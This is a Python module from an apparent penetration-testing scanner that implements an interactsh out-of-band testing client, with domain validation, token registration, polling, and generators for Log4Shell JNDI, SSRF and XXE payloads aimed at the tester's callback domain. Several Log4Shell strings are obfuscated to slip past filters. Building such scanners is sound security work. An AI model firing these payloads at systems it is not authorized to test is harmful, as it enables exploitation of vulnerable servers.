"""OAST (Out-of-Band Application Security Testing) client — interactsh integration."""
from __future__ import annotations
import asyncio
import ipaddress
import random
import re
import string
import time
from typing import Any
from urllib.parse import urlsplit
from talisman.engine.scope import ScopeConfig, ScopeEnforcer
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console

log = get_logger(__name__)

_HOST_LABEL_RE = re.compile(r"^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$")
_RESERVED_CALLBACK_SUFFIXES = (
    ".localhost",
    ".local",
    ".internal",
    ".test",
    ".invalid",
    ".example",
    ".home.arpa",
)


def normalize_oast_domain(value: str) -> str:
    """Validate a public callback hostname; return its normalized ASCII name."""
    if not isinstance(value, str) or not value.strip():
        raise ValueError("OAST domain is required")
    raw = value.strip()
    candidate = raw if "://" in raw else f"https://{raw}"
    try:
        parsed = urlsplit(candidate)
        host = (parsed.hostname or "").rstrip(".").lower()
        if (
            parsed.scheme not in {"http", "https"}
            or not host
            or parsed.username is not None
            or parsed.password is not None
            or parsed.port is not None
            or parsed.path not in {"", "/"}
            or parsed.query
            or parsed.fragment
            or any(character.isspace() for character in raw)
        ):
            raise ValueError

        try:
            address = ipaddress.ip_address(host)
        except ValueError:
            host = host.encode("idna").decode("ascii")
            if len(host) > 253:
                raise ValueError
            labels = host.split(".")
            if (
                len(labels) < 2
                or any(not _HOST_LABEL_RE.fullmatch(label) for label in labels)
                or any(host == suffix.lstrip(".") or host.endswith(suffix) for suffix in _RESERVED_CALLBACK_SUFFIXES)
            ):
                raise ValueError
        else:
            if not address.is_global:
                raise ValueError
            raise ValueError("OAST callbacks must use a hostname, not an IP literal")

        return host
    except (UnicodeError, ValueError) as exc:
        raise ValueError(
            "OAST domain must be a public hostname only; local, private, "
            "link-local, reserved and non-host URL values are not allowed"
        ) from exc




async def validate_public_oast_domain(value: str) -> str:
    """Require an OAST hostname that currently resolves only to public IPs."""
    host = normalize_oast_domain(value)
    scope = ScopeEnforcer(
        ScopeConfig(
            include=[host],
            exclude=[],
            service_allowlist=[],
        )
    )
    await scope.resolve_network_destination(f"https://{host}/", "GET")
    return host


class OASTClient:
 """Client for interactsh OAST server."""

 def __init__(
  self,
  server: str = "oast.pro",
  custom_url: str | None = None,
 ):
  self.server = normalize_oast_domain(custom_url or server)
  self._tokens: dict[str, dict[str, Any]] = {}

 def register(self) -> str:
  """Generate and retain a unique OAST interaction token."""
  token = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
  full = f"{token}.{self.server}"
  self._tokens[token] = {
   "full": full,
   "registered_at": time.time(),
   "hits": [],
  }
  return full

 def get_payload_url(self, prefix: str = "") -> str:
  """Get and retain a unique URL for OOB testing."""
  if prefix and not re.fullmatch(r"[a-z0-9-]{1,32}", prefix.lower()):
   raise ValueError("OAST payload prefix may contain only letters, digits and hyphens")
  token = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
  token_label = f"{prefix.lower()}-{token}" if prefix else token
  full = f"{token_label}.{self.server}"
  self._tokens[token_label] = {
   "full": full,
   "registered_at": time.time(),
   "hits": [],
  }
  return f"http://{full}/"

 def _registered_domain(self, token: str) -> str:
  domain_part = token.split(".")[0] if "." in token else token
  if not re.fullmatch(r"[a-z0-9-]{12,48}", domain_part):
   raise ValueError("Invalid OAST token")
  record = self._tokens.get(domain_part)
  if record is None:
   raise ValueError("OAST token was not registered by this client")
  if token not in {domain_part, record["full"]}:
   raise ValueError("OAST token does not match a registered interaction")
  return record["full"]

 async def poll(self, token: str, timeout: int = 30) -> list[dict[str, Any]]:
  """Poll interactsh for a token created by this client."""
  full_domain = self._registered_domain(token)
  domain_part = full_domain.split(".")[0]
  if isinstance(timeout, bool) or not isinstance(timeout, int) or timeout < 0 or timeout > 300:
   raise ValueError("OAST poll timeout must be between 0 and 300 seconds")
  hits: list[dict[str, Any]] = []
  deadline = time.monotonic() + timeout
  poll_scope = ScopeEnforcer(
   ScopeConfig(
    include=[self.server],
    exclude=[],
    service_allowlist=[],
   )
  )
  async with TalismanHTTPClient(
   scope=poll_scope,
   timeout=15,
   verify_ssl=True,
   follow_redirects=False,
  ) as client:
   while time.monotonic() < deadline:
    try:
     r = await client.get(
      f"https://{self.server}/poll",
      params={"id": domain_part},
      timeout=10,
     )
     if r.status_code == 200:
      data = r.json()
      if data.get("data"):
       for hit in data["data"]:
        hits.append({
         "type": hit.get("protocol", "unknown"),
         "source_ip": hit.get("remote-address", ""),
         "timestamp": hit.get("timestamp", ""),
         "raw": hit.get("raw-request", ""),
        })
       if hits:
        return hits
    except Exception as e:
     log.debug("oast_poll_error", error=str(e))
    await asyncio.sleep(5)
  return hits

 def get_log4shell_payloads(self, token: str) -> list[str]:
  """Get Log4Shell JNDI payloads pointing to OAST token."""
  domain = self._registered_domain(token)
  return [
   f"${{jndi:ldap://{domain}/a}}",
   f"${{${{lower:j}}ndi:${{lower:l}}dap://{domain}/a}}",
   f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{domain}/a}}",
   f"${{j${{::-n}}di:ldap://{domain}/a}}",
   f"${{jndi:rmi://{domain}/a}}",
   f"${{jndi:dns://{domain}/a}}",
   f"${{${{upper:j}}ndi:ldap://{domain}/a}}",
  ]

 def get_ssrf_payloads(self, token: str) -> list[str]:
  """Get SSRF payloads pointing to OAST token."""
  domain = self._registered_domain(token)
  return [
   f"http://{domain}/",
   f"https://{domain}/",
  ]

 def get_xxe_payloads(self, token: str) -> list[str]:
  """Get XXE OOB payloads."""
  domain = self._registered_domain(token)
  return [
   f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{domain}/xxe"> %xxe;]><r/>',
   f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><r>&xxe;</r>',
  ]
